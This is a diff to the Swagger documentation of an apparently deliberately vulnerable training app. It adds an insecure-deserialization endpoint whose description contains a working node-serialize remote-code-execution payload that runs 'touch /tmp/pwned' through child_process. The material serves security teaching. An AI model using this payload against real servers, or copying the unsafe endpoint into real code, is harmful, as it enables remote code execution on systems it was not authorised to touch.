@@ -23,6 +23,7 @@ const swaggerDocument = {
     { name: 'Vulnerabilities - Data Exposure', description: '⚠️ 민감한 정보 노출' },
     { name: 'Vulnerabilities - SSRF', description: '⚠️ 서버 측 요청 위조' },
     { name: 'Vulnerabilities - Mass Assignment', description: '⚠️ 대량 할당 취약점' },
+    { name: 'Vulnerabilities - Insecure Deserialization', description: '⚠️ 안전하지 않은 역직렬화' },
   ],
   paths: {
     '/users': {
@@ -311,7 +312,39 @@ const swaggerDocument = {
         },
       },
     },
+    '/vulnerable/deserialize': {
+      post: {
+        summary: '[취약점] Insecure Deserialization - 데이터 역직렬화',
+        description: '⚠️ Insecure Deserialization - 원격 코드 실행(RCE) 가능\n\n`node-serialize` 라이브러리를 사용하여 데이터를 역직렬화할 때, 조작된 페이로드를 통해 서버에서 임의의 코드를 실행할 수 있습니다.\n\n**공격 예제 (서버에 `/tmp/pwned` 파일 생성):**\n```json\n{\n  "data": "{\\"username\\":\\"pwned\\",\\"_is_serialized\\":true,\\"payload\\":\\"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned\')}()\\"}"\n}\n```',
+        tags: ['Vulnerabilities - Insecure Deserialization'],
+        requestBody: {
+          required: true,
+          content: {
+            'application/json': {
+              schema: {
+                type: 'object',
+                properties: {
+                  data: {
+                    type: 'string',
+                    example: '{"username":"test"}',
+                  },
+                },
+              },
+            },
+          },
+        },
+        responses: {
+          '200': {
+            description: '역직렬화 성공',
+          },
+          '400': {
+            description: '잘못된 요청',
+          },
+        },
+      },
+    },
   },
 };
+
 
 module.exports = swaggerDocument;
